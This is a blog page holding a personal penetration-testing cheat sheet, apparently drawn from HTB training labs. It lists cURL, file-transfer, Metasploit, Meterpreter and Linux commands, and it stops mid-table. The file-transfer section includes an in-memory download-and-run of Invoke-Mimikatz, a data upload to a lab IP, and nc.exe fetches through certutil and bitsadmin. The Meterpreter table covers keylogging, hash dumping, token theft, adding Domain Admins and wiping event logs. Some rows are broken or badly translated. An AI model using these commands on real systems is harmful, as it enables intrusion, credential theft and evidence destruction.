<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>备忘录</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="备忘录cURL


Command
Description



curl -h
cURL help menu


curl inlanefreight.com
Basic GET request


curl -s -O inlanefreight.com/index.html
Download file


curl -k https://inlanefreight.com
Skip HTTPS (SSL) certificate validation


curl inlanefreight.com -v
Print full HTTP request&amp;#x2F;response details


curl -I https://www.inlanefreight.com
Send HEAD req.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">备忘录</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95"><span class="toc-text">备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cURL"><span class="toc-text">cURL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APIs"><span class="toc-text">APIs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Browser-DevTools"><span class="toc-text">Browser DevTools</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Deobfuscation-Websites"><span class="toc-text">Deobfuscation Websites</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86"><span class="toc-text">用户管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7"><span class="toc-text">基本工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E5%BF%98%E5%BD%95-1"><span class="toc-text">备忘录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ffuf"><span class="toc-text">Ffuf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Wordlists"><span class="toc-text">Wordlists</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-text">目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E8%BF%9E%E6%8E%A5%E6%97%B6%E4%BF%A1%E6%81%AF"><span class="toc-text">指定连接时信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%B3%A8%E5%85%A5%E5%8F%82%E6%95%B0"><span class="toc-text">指定注入参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%A3%80%E6%B5%8B%E7%BA%A7%E5%88%AB"><span class="toc-text">指定检测级别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">指定注入类型</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E5%A6%82%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%BB%85%E6%B5%8B%E8%AF%95%E5%88%A9%E7%94%A8%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%92%8C%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E6%8F%90%E4%BE%9B-ES"><span class="toc-text">例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF"><span class="toc-text">枚举信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%B8%A6tamper%E4%BB%8B%E7%BB%8D"><span class="toc-text">自带tamper介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99tamper"><span class="toc-text">编写tamper</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dependencies"><span class="toc-text">dependencies</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95"><i class="tag post-item-tag">备忘录</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">备忘录</h1><time class="has-text-grey" datetime="2023-06-11T15:32:02.000Z">2023-06-11</time><article class="mt-2 post-content"><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>curl -h</code></td>
<td>cURL help menu</td>
</tr>
<tr>
<td><code>curl inlanefreight.com</code></td>
<td>Basic GET request</td>
</tr>
<tr>
<td><code>curl -s -O inlanefreight.com/index.html</code></td>
<td>Download file</td>
</tr>
<tr>
<td><code>curl -k https://inlanefreight.com</code></td>
<td>Skip HTTPS (SSL) certificate validation</td>
</tr>
<tr>
<td><code>curl inlanefreight.com -v</code></td>
<td>Print full HTTP request&#x2F;response details</td>
</tr>
<tr>
<td><code>curl -I https://www.inlanefreight.com</code></td>
<td>Send HEAD request (only prints response headers)</td>
</tr>
<tr>
<td><code>curl -i https://www.inlanefreight.com</code></td>
<td>Print response headers and response body</td>
</tr>
<tr>
<td><code>curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;</code></td>
<td>Set User-Agent header</td>
</tr>
<tr>
<td><code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set HTTP basic authorization credentials</td>
</tr>
<tr>
<td><code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Pass HTTP basic authorization credentials in the URL</td>
</tr>
<tr>
<td><code>curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set request header</td>
</tr>
<tr>
<td><code>curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le&#39;</code></td>
<td>Pass GET parameters</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Send POST request with POST data</td>
</tr>
<tr>
<td><code>curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></td>
<td>Set request cookies</td>
</tr>
<tr>
<td><code>curl -X POST -d &#39;&#123;&quot;search&quot;:&quot;london&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></td>
<td>Send POST request with JSON data</td>
</tr>
</tbody></table>
<span id="more"></span>

<h2 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h2><table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code></td>
<td>Read entry</td>
</tr>
<tr>
<td>&#96;curl -s http:&#x2F;&#x2F;<SERVER_IP>:<PORT>&#x2F;api.php&#x2F;city&#x2F;</td>
<td>jq&#96;</td>
</tr>
<tr>
<td><code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d &#39;&#123;&quot;city_name&quot;:&quot;HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
<td>Create (add) entry</td>
</tr>
<tr>
<td><code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;&#123;&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;&#125;&#39; -H &#39;Content-Type: application/json&#39;</code></td>
<td>Update (modify) entry</td>
</tr>
<tr>
<td><code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code></td>
<td>Delete entry</td>
</tr>
</tbody></table>
<h2 id="Browser-DevTools"><a href="#Browser-DevTools" class="headerlink" title="Browser DevTools"></a>Browser DevTools</h2><table>
<thead>
<tr>
<th><strong>Shortcut</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>[<code>CTRL+SHIFT+I</code>] or [<code>F12</code>]</td>
<td>Show devtools</td>
</tr>
<tr>
<td>[<code>CTRL+SHIFT+E</code>]</td>
<td>Show Network tab</td>
</tr>
<tr>
<td>[<code>CTRL+SHIFT+K</code>]</td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><code>curl http:/SERVER_IP:PORT/</code></th>
<th>cURL 获取请求</th>
</tr>
</thead>
<tbody><tr>
<td><code>curl -s http:/SERVER_IP:PORT/ -X POST</code></td>
<td>cURL 发布请求</td>
</tr>
<tr>
<td><code>curl -s http:/SERVER_IP:PORT/ -X POST -d &quot;param1=sample&quot;</code></td>
<td>包含数据的网址 POST 请求</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
<td>base64&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_B64</td>
<td>base64 -d&#96;</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
<td>xxd -p&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_HEX</td>
<td>xxd -p -r&#96;</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_ROT13</td>
<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
</tr>
</tbody></table>
<h1 id="Deobfuscation-Websites"><a href="#Deobfuscation-Websites" class="headerlink" title="Deobfuscation Websites"></a>Deobfuscation Websites</h1><table>
<thead>
<tr>
<th><strong>Website</strong></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://jsconsole.com/">JS Console</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://prettier.io/playground/">Prettier</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://beautifier.io/">Beautifier</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://www.jsnice.org/">JSNice</a></td>
</tr>
</tbody></table>
<p>##文件传输</p>
<table>
<thead>
<tr>
<th><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></th>
<th>使用 PowerShell 下载文件</th>
</tr>
</thead>
<tbody><tr>
<td><code>IEX (New-Object Net.WebClient).DownloadString(&#39;https://&lt;snip&gt;/Invoke-Mimikatz.ps1&#39;)</code></td>
<td>使用 PowerShell 在内存中执行文件</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
<td>使用 PowerShell 上传文件</td>
</tr>
<tr>
<td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
<td>使用 Bitsadmin 下载文件</td>
</tr>
<tr>
<td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
<td>使用 Certutil 下载文件</td>
</tr>
<tr>
<td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
<td>使用 Wget 下载文件</td>
</tr>
<tr>
<td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
<td>使用 cURL 下载文件</td>
</tr>
<tr>
<td><code>php -r &#39;$file = file_get_contents(&quot;https://&lt;snip&gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></td>
<td>使用 PHP 下载文件</td>
</tr>
<tr>
<td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
<td>使用 SCP 上传文件</td>
</tr>
<tr>
<td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
<td>使用 SCP 下载文件</td>
</tr>
<tr>
<td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;</code></td>
<td>使用 Chrome 用户代理的 Invoke-WebRequest</td>
</tr>
</tbody></table>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><table>
<thead>
<tr>
<th><code>show exploits</code></th>
<th>显示框架内的所有漏洞。</th>
</tr>
</thead>
<tbody><tr>
<td><code>show payloads</code></td>
<td>显示框架中的所有有效负载。</td>
</tr>
<tr>
<td><code>show auxiliary</code></td>
<td>显示框架中的所有辅助模块。</td>
</tr>
<tr>
<td><code>search &lt;name&gt;</code></td>
<td>在框架中搜索漏洞或模块。</td>
</tr>
<tr>
<td><code>info</code></td>
<td>加载有关特定漏洞利用或模块的信息。</td>
</tr>
<tr>
<td><code>use &lt;name&gt;</code></td>
<td>加载漏洞利用或模块（例如：使用 Windows&#x2F;smb&#x2F;psexec）。</td>
</tr>
<tr>
<td><code>use &lt;number&gt;</code></td>
<td>使用搜索命令后显示的索引号加载漏洞利用。</td>
</tr>
<tr>
<td><code>LHOST</code></td>
<td>目标可访问的本地主机 IP 地址，如果不在本地网络上，通常是公共 IP 地址。通常用于反向壳。</td>
</tr>
<tr>
<td><code>RHOST</code></td>
<td>远程主机或目标。set函数 设置特定值（例如，LHOST 或 RHOST）。</td>
</tr>
<tr>
<td><code>setg &lt;function&gt;</code></td>
<td>全局设置特定值（例如，LHOST 或 RHOST）。</td>
</tr>
<tr>
<td><code>show options</code></td>
<td>显示可用于模块或漏洞利用的选项。</td>
</tr>
<tr>
<td><code>show targets</code></td>
<td>显示漏洞利用支持的平台。</td>
</tr>
<tr>
<td><code>set target &lt;number&gt;</code></td>
<td>如果您知道操作系统和服务包，请指定特定的目标索引。</td>
</tr>
<tr>
<td><code>set payload &lt;payload&gt;</code></td>
<td>指定要使用的有效负载。</td>
</tr>
<tr>
<td><code>set payload &lt;number&gt;</code></td>
<td>指定要在显示有效负载命令后使用的有效负载索引号。</td>
</tr>
<tr>
<td><code>show advanced</code></td>
<td>显示高级选项。</td>
</tr>
<tr>
<td><code>set autorunscript migrate -f</code></td>
<td>漏洞利用完成后自动迁移到单独的进程。</td>
</tr>
<tr>
<td><code>check</code></td>
<td>确定目标是否容易受到攻击。</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>执行模块或利用并攻击目标。</td>
</tr>
<tr>
<td><code>exploit -j</code></td>
<td>在作业上下文中运行漏洞利用。（这将在后台运行漏洞利用。</td>
</tr>
<tr>
<td><code>exploit -z</code></td>
<td>成功利用漏洞后不要与会话交互。</td>
</tr>
<tr>
<td><code>exploit -e &lt;encoder&gt;</code></td>
<td>指定要使用的有效负载编码器（例如：exploit –e shikata_ga_nai）。</td>
</tr>
<tr>
<td><code>exploit -h</code></td>
<td>显示漏洞利用命令的帮助。</td>
</tr>
<tr>
<td><code>sessions -l</code></td>
<td>列出可用会话（在处理多个 shell 时使用）。</td>
</tr>
<tr>
<td><code>sessions -l -v</code></td>
<td>列出所有可用会话并显示详细字段，例如利用系统时使用了哪个漏洞。</td>
</tr>
<tr>
<td><code>sessions -s &lt;script&gt;</code></td>
<td>在所有 Meterpreter 实时会话上运行特定的 Meterpreter 脚本。</td>
</tr>
<tr>
<td><code>sessions -K</code></td>
<td>终止所有实时会话。</td>
</tr>
<tr>
<td><code>sessions -c &lt;cmd&gt;</code></td>
<td>在所有实时 Meterpreter 会话上执行命令。</td>
</tr>
<tr>
<td><code>sessions -u &lt;sessionID&gt;</code></td>
<td>将普通的 Win32 外壳升级到 Meterpreter 控制台。</td>
</tr>
<tr>
<td><code>db_create &lt;name&gt;</code></td>
<td>创建用于数据库驱动攻击的数据库（例如：db_create autopwn）。</td>
</tr>
<tr>
<td><code>db_connect &lt;name&gt;</code></td>
<td>创建并连接到用于驱动攻击的数据库（例如：db_connect autopwn）。</td>
</tr>
<tr>
<td><code>db_nmap</code></td>
<td>使用 Nmap 并将结果放入数据库中。（支持正常的 Nmap 语法，例如 –sT –v –P0。</td>
</tr>
<tr>
<td><code>db_destroy</code></td>
<td>删除当前数据库。</td>
</tr>
<tr>
<td><code>db_destroy &lt;user:password@host:port/database&gt;</code></td>
<td>使用高级选项删除数据库。</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>help</code></td>
<td>打开 Meterpreter 使用帮助。</td>
</tr>
<tr>
<td><code>run &lt;scriptname&gt;</code></td>
<td>运行基于 Meterpreter 的脚本;有关完整列表，请查看 scripts&#x2F;meterpreter 目录。</td>
</tr>
<tr>
<td><code>sysinfo</code></td>
<td>显示有关受损目标的系统信息。</td>
</tr>
<tr>
<td><code>ls</code></td>
<td>列出目标上的文件和文件夹。</td>
</tr>
<tr>
<td><code>use priv</code></td>
<td>加载扩展的 Meterpreter 库的权限扩展。</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>显示所有正在运行的进程以及与每个进程关联的帐户。</td>
</tr>
<tr>
<td><code>migrate &lt;proc. id&gt;</code></td>
<td>迁移到特定进程 ID（PID 是从 ps 命令获取的目标进程 ID）。</td>
</tr>
<tr>
<td><code>use incognito</code></td>
<td>加载隐身功能。（用于目标计算机上的令牌窃取和模拟。</td>
</tr>
<tr>
<td><code>list_tokens -u</code></td>
<td>按用户列出目标上的可用令牌。</td>
</tr>
<tr>
<td><code>list_tokens -g</code></td>
<td>按组列出目标上的可用令牌。</td>
</tr>
<tr>
<td><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></td>
<td>模拟目标上可用的令牌。</td>
</tr>
<tr>
<td><code>steal_token &lt;proc. id&gt;</code></td>
<td>窃取可用于给定进程的令牌并模拟该令牌。</td>
</tr>
<tr>
<td><code>drop_token</code></td>
<td>停止模拟当前令牌。</td>
</tr>
<tr>
<td><code>getsystem</code></td>
<td>尝试通过多个攻击媒介将权限提升为 SYSTEM 级访问权限。</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>放入包含所有可用令牌的交互式外壳中。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i</code></td>
<td>执行cmd.exe并与之交互。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -t</code></td>
<td>使用所有可用的令牌执行 cmd.exe。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -H -t</code></td>
<td>使用所有可用的令牌执行cmd.exe并使其成为隐藏进程。</td>
</tr>
<tr>
<td><code>rev2self</code></td>
<td>恢复为用于破坏目标的原始用户。</td>
</tr>
<tr>
<td><code>reg &lt;command&gt;</code></td>
<td>在目标注册表中进行交互、创建、删除、查询、设置等。</td>
</tr>
<tr>
<td><code>setdesktop &lt;number&gt;</code></td>
<td>根据登录者切换到其他屏幕。</td>
</tr>
<tr>
<td><code>screenshot</code></td>
<td>截取目标屏幕的屏幕截图。</td>
</tr>
<tr>
<td><code>upload &lt;filename&gt;</code></td>
<td>将文件上传到目标。</td>
</tr>
<tr>
<td><code>download &lt;filename&gt;</code></td>
<td>从目标下载文件。</td>
</tr>
<tr>
<td><code>keyscan_start</code></td>
<td>开始在远程目标上嗅探击键。</td>
</tr>
<tr>
<td><code>keyscan_dump</code></td>
<td>转储在目标上捕获的远程密钥。</td>
</tr>
<tr>
<td><code>keyscan_stop</code></td>
<td>停止在远程目标上嗅探击键。</td>
</tr>
<tr>
<td><code>getprivs</code></td>
<td>在目标上获得尽可能多的权限。</td>
</tr>
<tr>
<td><code>uictl enable &lt;keyboard/mouse&gt;</code></td>
<td>控制键盘和&#x2F;或鼠标。</td>
</tr>
<tr>
<td><code>background</code></td>
<td>在后台运行您当前的 Meterpreter shell。</td>
</tr>
<tr>
<td><code>hashdump</code></td>
<td>在目标上转储所有哈希。使用嗅探器 加载嗅探器模块。</td>
</tr>
<tr>
<td><code>sniffer_interfaces</code></td>
<td>列出目标上的可用接口。</td>
</tr>
<tr>
<td><code>sniffer_dump &lt;interfaceID&gt; pcapname</code></td>
<td>开始在远程目标上嗅探。</td>
</tr>
<tr>
<td><code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></td>
<td>从特定范围的数据包缓冲区开始嗅探。</td>
</tr>
<tr>
<td><code>sniffer_stats &lt;interfaceID&gt;</code></td>
<td>从您正在嗅探的界面中获取统计信息。</td>
</tr>
<tr>
<td><code>sniffer_stop &lt;interfaceID&gt;</code></td>
<td>停止嗅探器。</td>
</tr>
<tr>
<td><code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></td>
<td>在远程目标上添加用户。</td>
</tr>
<tr>
<td><code>add_group_user &lt;&quot;Domain Admins&quot;&gt; &lt;username&gt; -h &lt;ip&gt;</code></td>
<td>将用户名添加到远程目标上的域管理员组。</td>
</tr>
<tr>
<td><code>clearev</code></td>
<td>清除目标计算机上的事件日志。</td>
</tr>
<tr>
<td><code>timestomp</code></td>
<td>更改文件属性，例如创建日期（反取证度量）。</td>
</tr>
<tr>
<td><code>reboot</code></td>
<td>重新启动目标计算机。</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th><code>man &lt;tool&gt;</code></th>
<th>打开指定工具的手册页。</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;tool&gt; -h</code></td>
<td>打印工具的帮助页。</td>
</tr>
<tr>
<td><code>apropos &lt;keyword&gt;</code></td>
<td>在手册页的描述中搜索给定关键字的实例。</td>
</tr>
<tr>
<td><code>cat</code></td>
<td>连接和打印文件。</td>
</tr>
<tr>
<td><code>whoami</code></td>
<td>显示当前用户名。</td>
</tr>
<tr>
<td><code>id</code></td>
<td>返回用户标识。</td>
</tr>
<tr>
<td><code>hostname</code></td>
<td>设置或打印当前主机系统的名称。</td>
</tr>
<tr>
<td><code>uname</code></td>
<td>打印操作系统名称。</td>
</tr>
<tr>
<td><code>pwd</code></td>
<td>返回工作目录名称。</td>
</tr>
<tr>
<td><code>ifconfig</code></td>
<td>该实用程序用于为网络接口分配或查看地址和&#x2F;或配置网络接口参数。<code>ifconfig</code></td>
</tr>
<tr>
<td><code>ip</code></td>
<td>Ip 是用于显示或操作路由、网络设备、接口和隧道的实用程序。</td>
</tr>
<tr>
<td><code>netstat</code></td>
<td>显示网络状态。</td>
</tr>
<tr>
<td><code>ss</code></td>
<td>另一个用于调查套接字的实用程序。</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>显示进程状态。</td>
</tr>
<tr>
<td><code>who</code></td>
<td>显示登录者。</td>
</tr>
<tr>
<td><code>env</code></td>
<td>打印环境或设置并执行命令。</td>
</tr>
<tr>
<td><code>lsblk</code></td>
<td>列出块设备。</td>
</tr>
<tr>
<td><code>lsusb</code></td>
<td>列出 USB 设备。</td>
</tr>
<tr>
<td><code>lsof</code></td>
<td>列出打开的文件。</td>
</tr>
<tr>
<td><code>lspci</code></td>
<td>列出 PCI 设备。</td>
</tr>
<tr>
<td><code>sudo</code></td>
<td>以其他用户身份执行命令。</td>
</tr>
<tr>
<td><code>su</code></td>
<td>该实用程序通过 PAM 请求适当的用户凭证，并切换到该用户 ID（缺省用户是超级用户）。然后执行一个 shell。<code>su</code></td>
</tr>
<tr>
<td><code>useradd</code></td>
<td>创建新用户或更新默认新用户信息。</td>
</tr>
<tr>
<td><code>userdel</code></td>
<td>删除用户帐户和相关文件。</td>
</tr>
<tr>
<td><code>usermod</code></td>
<td>修改用户帐户。</td>
</tr>
<tr>
<td><code>addgroup</code></td>
<td>将组添加到系统。</td>
</tr>
<tr>
<td><code>delgroup</code></td>
<td>从系统中删除组。</td>
</tr>
<tr>
<td><code>passwd</code></td>
<td>更改用户密码。</td>
</tr>
<tr>
<td><code>dpkg</code></td>
<td>安装、删除和配置基于 Debian 的软件包。</td>
</tr>
<tr>
<td><code>apt</code></td>
<td>高级包管理命令行实用工具。</td>
</tr>
<tr>
<td><code>aptitude</code></td>
<td>的替代项。<code>apt</code></td>
</tr>
<tr>
<td><code>snap</code></td>
<td>安装、删除和配置快照包。</td>
</tr>
<tr>
<td><code>gem</code></td>
<td>Ruby 的标准包管理器。</td>
</tr>
<tr>
<td><code>pip</code></td>
<td>Python 的标准包管理器。</td>
</tr>
<tr>
<td><code>git</code></td>
<td>版本控制系统命令行实用程序。</td>
</tr>
<tr>
<td><code>systemctl</code></td>
<td>基于命令行的服务和系统控制管理器。</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>打印当前进程的快照。</td>
</tr>
<tr>
<td><code>journalctl</code></td>
<td>查询系统日志。</td>
</tr>
<tr>
<td><code>kill</code></td>
<td>向进程发送信号。</td>
</tr>
<tr>
<td><code>bg</code></td>
<td>将进程置于后台。</td>
</tr>
<tr>
<td><code>jobs</code></td>
<td>列出在后台运行的所有进程。</td>
</tr>
<tr>
<td><code>fg</code></td>
<td>将进程置于前台。</td>
</tr>
<tr>
<td><code>curl</code></td>
<td>用于从服务器传输数据或将数据传输到服务器的命令行实用程序。</td>
</tr>
<tr>
<td><code>wget</code></td>
<td>另一种方法是从FTP或HTTP（s）服务器下载文件。<code>curl</code></td>
</tr>
<tr>
<td><code>python3 -m http.server</code></td>
<td>在 TCP 端口 3 上启动 Python8000 Web 服务器。</td>
</tr>
<tr>
<td><code>ls</code></td>
<td>列出目录内容。</td>
</tr>
<tr>
<td><code>cd</code></td>
<td>更改目录。</td>
</tr>
<tr>
<td><code>clear</code></td>
<td>清除终端。</td>
</tr>
<tr>
<td><code>touch</code></td>
<td>创建一个空文件。</td>
</tr>
<tr>
<td><code>mkdir</code></td>
<td>创建目录。</td>
</tr>
<tr>
<td><code>tree</code></td>
<td>以递归方式列出目录的内容。</td>
</tr>
<tr>
<td><code>mv</code></td>
<td>移动或重命名文件或目录。</td>
</tr>
<tr>
<td><code>cp</code></td>
<td>复制文件或目录。</td>
</tr>
<tr>
<td><code>nano</code></td>
<td>基于终端的文本编辑器。</td>
</tr>
<tr>
<td><code>which</code></td>
<td>返回文件或链接的路径。</td>
</tr>
<tr>
<td><code>find</code></td>
<td>在目录层次结构中搜索文件。</td>
</tr>
<tr>
<td><code>updatedb</code></td>
<td>更新系统上现有内容的区域设置数据库。</td>
</tr>
<tr>
<td><code>locate</code></td>
<td>使用区域设置数据库查找系统上的内容。</td>
</tr>
<tr>
<td><code>more</code></td>
<td>用于读取标准输出或文件的寻呼机。</td>
</tr>
<tr>
<td><code>less</code></td>
<td>具有更多功能的替代方案。<code>more</code></td>
</tr>
<tr>
<td><code>head</code></td>
<td>打印 STDOUT 的前十行或文件。</td>
</tr>
<tr>
<td><code>tail</code></td>
<td>打印 STDOUT 或文件的最后十行。</td>
</tr>
<tr>
<td><code>sort</code></td>
